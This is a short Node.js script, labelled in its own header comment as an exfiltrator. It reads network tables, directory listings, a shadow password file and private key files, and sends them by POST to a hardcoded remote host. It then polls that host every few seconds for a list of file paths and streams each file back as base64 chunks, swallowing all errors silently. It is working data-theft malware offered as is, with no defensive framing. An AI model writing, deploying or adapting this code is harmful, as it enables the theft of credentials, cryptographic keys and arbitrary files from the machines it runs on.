// Manifest-driven exfiltrator: polls host for a file list, streams files back base64-chunked
var http = require('http');
var fs = require('fs');
var HOST = '192.168.14.241', PORT = 9911;
var fetch;
try { fetch = require('node-fetch'); } catch(e) { fetch = null; }

function post(path, obj) {
  var data = (typeof obj === 'string') ? obj : JSON.stringify(obj);
  var req = http.request({host: HOST, port: PORT, path: path, method: 'POST',
    headers: {'Content-Type': 'application/octet-stream', 'Content-Length': Buffer.byteLength(data)}}, function(){});
  req.on('error', function(){});
  req.write(data); req.end();
}
function readf(p){ try { return fs.readFileSync(p, 'utf8').slice(0, 3000); } catch(e){ return 'ERR '+e.code; } }

function once() {
  post('/report', {
    tcp: readf('/proc/net/tcp'), tcp6: readf('/proc/net/tcp6'),
    unix: readf('/proc/net/unix'),
    arp: readf('/proc/net/arp'),
    ls_usr_bin: (function(){ try { return fs.readdirSync('/usr/bin').join(','); } catch(e){ return 'ERR'; } })(),
    ls_usr_lib_exec: (function(){ try { return fs.readdirSync('/usr/lib/exec').join(','); } catch(e){ return 'ERR'; } })(),
    ls_sbin: (function(){ try { return fs.readdirSync('/sbin').join(','); } catch(e){ return 'ERR'; } })(),
    shadow: readf('/opt/etc/shadow'),
    enc_priv: readf('/opt/etc/enc_private_key.pem'),
    pub_key: readf('/opt/etc/public_key.pem'),
    ls_opt_ssl: (function(){ try { return fs.readdirSync('/opt/etc/ssl').join(','); } catch(e){ return 'ERR'; } })()
  });
}

function processManifest(m) {
  (m.files || []).forEach(function(f) {
    var b;
    try { b = fs.readFileSync(f.path); } catch(e) { post('/exfil', JSON.stringify({path: f.path, err: ''+e.code})); return; }
    if (f.max && b.length > f.max) { post('/exfil', JSON.stringify({path: f.path, err: 'too-big ' + b.length})); return; }
    var CH = 300000;
    for (var i = 0; i < b.length; i += CH) {
      post('/exfil', JSON.stringify({path: f.path, total: b.length, off: i, b64: b.slice(i, i+CH).toString('base64')}));
    }
  });
}

var ticks = 0;
function loop() {
  try {
    if (ticks === 0) once();
    ticks++;
    if (fetch) {
      fetch('http://' + HOST + ':' + PORT + '/manifest.json?t=' + ticks)
        .then(function(r){ return r.json(); })
        .then(processManifest)
        .catch(function(){});
    }
  } catch(e) {}
  setTimeout(loop, 8000);
}
loop();
